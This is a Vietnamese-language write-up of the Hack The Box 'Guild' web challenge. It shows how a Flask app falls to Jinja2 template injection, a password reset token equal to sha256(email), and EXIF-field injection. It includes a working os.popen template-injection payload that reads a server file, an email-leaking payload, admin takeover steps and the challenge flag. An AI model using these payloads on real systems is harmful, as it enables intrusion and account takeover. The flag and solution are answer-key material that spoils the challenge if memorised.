# Guild — Writeup (HTB Try Out / Web) (Tiếng Việt)

## 1. Đề
Challenge WEB (easy), có source `web_guild.zip`.
Target: `http://154.57.164.82:31795`
Mục tiêu: đọc `/app/flag.txt`, flag `HTB{...}`.
App Flask "Guild": signup/login, nộp badge để Guild Master duyệt, profile/bio, share link.

## 2. Kiến thức nền
- **SSTI (Jinja2)**: `render_template_string` đánh giá `{{...}}` trên server. Probe: `{{7+7}}` → `14`.
- **WAF substring**: `checkInput()` chặn `__`, `[]`, `os`, `popen`, `config`, `attr`, `class`, `*`… nên RCE trực tiếp trên bio khó; vẫn đọc được object trong context (`User`).
- **Password reset yếu**: token = `sha256(email)` (không secret, không expiry).
- **EXIF**: admin `/verify` đọc tag `Artist` rồi `render_template_string("Verified! {}".format(sec_code))` — SSTI **không WAF**.

## 3. Phân tích
- `share()`: `render_template_string(template % bio)` — `%s` trong `shareprofile.html` chèn bio rồi Jinja render. `User` được truyền vào context.
- Bio chỉ cần có hàng `Verification` (upload ảnh), không cần `verified==1`.
- Admin được seed lúc start, email ngẫu nhiên `hex@master.guild`, user id = 1.
- `/forgetpassword` in token ra stdout (không gửi mail); token đoán được nếu biết email.
- `/verify` chỉ `current_user.username == "admin"`.

## 4. Vì sao hướng này
- H1 bio SSTI: rẻ, xác nhận Jinja ngay. WAF chặn RCE → dùng SSTI để **leak email**, không đọc file.
- H2 reset SHA256(email): một khi có email admin thì chiếm account không cần brute.
- H3 EXIF SSTI: payload RCE đặt lúc user thường upload; admin bấm Verify là chạy. Không có bot XSS nên phải tự login admin.

## 5. Các bước
1. Signup/login → POST `/verification` JPEG có EXIF Artist =
   `{{cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read()}}`
2. POST `/profile` bio `{{7+7}}` → `/getlink` → GET `/user/<user>` hiện `14`.
3. Đổi bio `{{User.query.get(1).email}}` → leak `466774513041614c@master.guild`.
4. POST `/forgetpassword` → `token = sha256(email)` → POST `/changepasswd/<token>`.
5. Login `admin` → POST `/verify` (`user_id=2`, `verification_id=1`).
6. Response: `Verified! HTB{...}`. Replay session độc lập → cùng flag.

```text
python solve/solve.py --target http://154.57.164.82:31795
```

## 6. Flag
```
HTB{mult1pl3_lo0p5_mult1pl3_h0les_c7d6e9e6f977892138674af6b827a0ad}
```
